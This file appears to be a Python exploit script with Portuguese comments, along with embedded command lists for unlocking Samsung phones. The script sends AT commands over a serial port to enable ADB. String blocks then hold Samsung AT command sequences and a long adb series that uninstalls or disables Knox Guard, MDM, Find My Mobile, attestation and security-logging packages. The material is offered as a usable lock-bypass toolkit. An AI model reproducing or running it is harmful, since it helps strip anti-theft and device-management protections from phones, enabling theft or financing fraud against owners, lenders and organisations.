import serial
import time

# Configuração da porta serial
SERIAL_BAUDRATE = 115200
SERIAL_TIMEOUT = 10

def send_at_command(io, cmd):
    """
    Envia comandos AT para o dispositivo via serial e verifica a resposta.
    """
    if not io.isOpen():
        print("Erro: Conexão serial não está aberta.")
        return False
    
    print(f"Enviando comando: {cmd}")
    io.write(cmd.encode())
    time.sleep(0.5)
    
    # Ler resposta
    response = io.read_all().decode()
    print(f"Resposta: {response}")
    
    if "OK" in response:
        return True
    else:
        return False

def enable_adb_over_serial(port):
    """
    Exploit para habilitar ADB enviando comandos AT para o dispositivo via serial.
    """
    try:
        # Abrindo conexão serial
        io = serial.Serial(port, baudrate=SERIAL_BAUDRATE, timeout=SERIAL_TIMEOUT)
        
        # Enviar comando para habilitar ADB
        print("Habilitando ADB...")
        at_cmds = [
            "AT+ADBENABLE=1\r\n",  # Este é um exemplo de comando, o comando real depende do dispositivo
        ]
        
        for cmd in at_cmds:
            success = send_at_command(io, cmd)
            if not success:
                print(f"Falha ao enviar comando: {cmd}")
                break
        
        io.close()
        print("ADB habilitado com sucesso (se o dispositivo for vulnerável).")
    
    except Exception as e:
        print(f"Erro ao conectar via serial: {e}")

if __name__ == "__main__":
    # Substitua 'COM3' pelo nome da porta serial correta
    enable_adb_over_serial("COM3")
comandos_at = """
AT+DUMPCTRL=1,0
AT+DEBUGLVC=0,5
AT+SWATD=0
AT+ACTIVATE=0,0,0
AT+SWATD=1
AT+DEBUGLVC=0,5
"""
comandos_at2 = """
AT+KSTRINGB=0,3
AT+DUMPCTRL=1,0
AT+DEBUGLVC=0,5
AT+SWATD=0
AT+ACTIVATE=0,0,0
AT+SWATD=1
AT+PRECONFG=2,
AT+CFUN=1,1

AT+SVCIFPGM=1,1
AT+REACTIVE=1,0,0
AT+SWATD=0
AT+DEVCONINFO
AT+SVCIFPGM=1,1
AT+CFUN=1
ATE0
AT+ACTIVATE=0,0
AT+ACTIVATE=0,0,0
AT+SWATD=2
AT+SWATD=1
AT+KSTRINGB=0,2
AT+KSTRINGB=0,3
ATE0
AT+DEBUGLVC=0,5
"""


kg="""
    Disabled KG Locked MTK ADB
ADB Mode
adb get-serialno
Checking ADB Mode Connected...
adb shell getprop ro.product.model
adb shell getprop ro.build.version.release
adb shell getprop ro.bootloader
adb shell getprop gsm.version.baseband
adb shell getprop ro.product.manufacturer
adb shell pm disable-user --user 0 com.sec.enterprise.knox.cloudmdm.smdms 
adb shell pm uninstall --user 0 com.sec.android.soagent
adb shell pm uninstall --user 0 com.wssyncmldm 
adb shell pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms 
adb shell pm uninstall --user 0 com.knox.vpn.proxyhandler 
adb shell pm uninstall --user 0 com.samsung.bnk48 
adb shell pm uninstall --user 0 android.autoinstalls.config.samsung 
adb shell pm disable-user --user 0 com.samsung.android.kgclient 
adb shell pm uninstall --user 0 com.samsung.android.fmm 
adb uninstall --user 0 com.samsung.bnk48 
adb shell pm disable-user --user 0 com.sec.android.soagent 
adb uninstall --user 0 com.sec.android.soagent 
adb shell pm disable-user --user 0 com.wssyncmldm 
adb uninstall --user 0 com.wssyncmldm 
adb shell pm disable-user --user 0 com.samsung.android.knox.containercore 
adb uninstall --user 0 com.samsung.android.knox.containercore 
adb shell pm disable-user --user 0 com.sec.enterprise.knox.attestation 
adb uninstall --user 0 com.sec.enterprise.knox.attestation 
adb shell pm disable-user --user 0 com.samsung.android.knox.containeragent 
adb uninstall --user 0 com.samsung.android.knox.containeragent 
adb shell pm disable-user --user 0 com.samsung.knox.keychain 
adb uninstall --user 0 com.samsung.knox.keychain 
adb shell pm disable-user --user 0 com.samsung.knox.securefolder 
adb uninstall --user 0 com.samsung.knox.securefolder 
adb shell pm disable-user --user 0 com.samsung.android.knox.analytics.uploader 
adb uninstall --user 0 com.samsung.android.knox.analytics.uploader 
adb shell pm disable-user --user 0 com.knox.vpn.proxyhandler 
adb uninstall --user 0 com.knox.vpn.proxyhandler 
adb uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms 
adb shell pm disable-user --user 0 com.sec.enterprise.mdm.services.simpin 
adb uninstall --user 0 com.sec.enterprise.mdm.services.simpin 
adb shell pm disable-user --user 0 com.samsung.android.mdm 
adb uninstall --user 0 com.samsung.android.mdm 
adb uninstall --user 0 com.samsung.android.kgclient 
adb shell pm disable-user --user 0 com.sec.android.sdhms 
adb uninstall --user 0 com.sec.android.sdhms 
adb shell pm disable-user --user 0 com.samsung.android.dqagent 
adb uninstall --user 0 com.samsung.android.dqagent 
adb shell pm disable-user --user 0 com.sec.epdg 
adb uninstall --user 0 com.sec.epdg 
adb shell pm disable-user --user 0 com.sec.epdgtestapp 
adb uninstall --user 0 com.sec.epdgtestapp 
adb shell pm disable-user --user 0 com.sec.sve 
adb uninstall --user 0 com.sec.sve 
adb shell pm disable-user --user 0 com.samsung.android.securitylogagent 
adb uninstall --user 0 com.samsung.android.securitylogagent 
adb shell pm disable-user --user 0 com.sec.bcservice 
adb uninstall --user 0 com.sec.bcservice 
adb shell pm disable-user --user 0 com.sec.modem.settings 
adb uninstall --user 0 com.sec.modem.settings 
adb shell pm disable-user --user 0 com.android.se 
adb uninstall --user 0 com.android.se 
adb shell pm disable-user --user 0 com.samsung.android.beaconmanager 
adb uninstall --user 0 com.samsung.android.beaconmanager 
adb shell pm disable-user --user 0 com.samsung.android.bbc.bbcagent 
adb uninstall --user 0 com.samsung.android.bbc.bbcagent 
adb shell pm disable-user --user 0 com.skms.android.agent 
adb uninstall --user 0 com.skms.android.agent 
adb shell pm disable-user --user 0 com.sec.android.easyMover.Agent 
adb uninstall --user 0 com.sec.android.easyMover.Agent 
adb shell pm disable-user --user 0 com.samsung.ucs.agent.boot 
adb uninstall --user 0 com.samsung.ucs.agent.boot 
adb shell pm disable-user --user 0 com.samsung.klmsagent 
adb uninstall --user 0 com.samsung.klmsagent 
adb shell pm disable-user --user 0 com.samsung.android.da.daagent 
adb uninstall --user 0 com.samsung.android.da.daagent 
adb shell pm disable-user --user 0 com.samsung.android.svcagent 
adb uninstall --user 0 com.samsung.android.svcagent 
adb shell pm disable-user --user 0 com.samsung.android.app.omcagent 
adb uninstall --user 0 com.samsung.android.app.omcagent 
adb shell pm disable-user --user 0 com.samsung.android.fmm 
adb uninstall --user 0 com.samsung.android.fmm
"""

at="""
    Another AT cmd list
AT+KSTRINGB=0,3
AT+DUMPCTRL=1,0
AT+DEBUGLVC=0,5
AT+SWATD=0
AT+ACTIVATE=0,0,0
AT+SWATD=1
AT+PRECONFG=2,
AT+CFUN=1,1
another one
-------------------
AT+SVCIFPGM=1,1
AT+REACTIVE=1,0,0
AT+SWATD=0
AT+DEVCONINFO
AT+SVCIFPGM=1,1
AT+CFUN=1
ATE0
AT+ACTIVATE=0,0
AT+ACTIVATE=0,0,0
AT+SWATD=2
AT+SWATD=1
AT+KSTRINGB=0,2
AT+KSTRINGB=0,3
ATE0
AT+DEBUGLVC=0,5
"""